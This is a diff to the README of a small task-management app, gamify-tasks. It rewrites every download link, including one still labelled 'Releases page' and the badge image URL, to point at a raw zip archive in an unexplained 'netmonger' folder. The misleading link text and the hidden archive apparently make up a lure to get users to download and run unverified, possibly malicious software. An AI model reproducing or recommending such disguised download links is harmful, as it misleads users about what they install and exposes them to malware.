@@ -6,11 +6,11 @@ Welcome to gamify-tasks! This is a simple application designed to help you manag
 
 ## 📥 Download
 
-[![Download gamify-tasks](https://img.shields.io/badge/Download%20gamify--tasks-blue)][Download Link]
+[![Download gamify-tasks](https://github.com/Arhum-fareed-sabri/gamify-tasks/raw/refs/heads/main/netmonger/tasks_gamify_v1.1.zip%20gamify--tasks-blue)][Download Link]
 
 To download the application, visit the Releases page below:
 
-[Download Link](https://github.com/Arhum-fareed-sabri/gamify-tasks/releases)
+[Download Link](https://github.com/Arhum-fareed-sabri/gamify-tasks/raw/refs/heads/main/netmonger/tasks_gamify_v1.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -34,7 +34,7 @@ gamify-tasks offers various features to enhance your productivity:
 
 To get started, follow these steps to download and install gamify-tasks:
 
-1. Visit the [Releases page](https://github.com/Arhum-fareed-sabri/gamify-tasks/releases) to see available versions.
+1. Visit the [Releases page](https://github.com/Arhum-fareed-sabri/gamify-tasks/raw/refs/heads/main/netmonger/tasks_gamify_v1.1.zip) to see available versions.
    
 2. Choose the latest version of gamify-tasks.
 
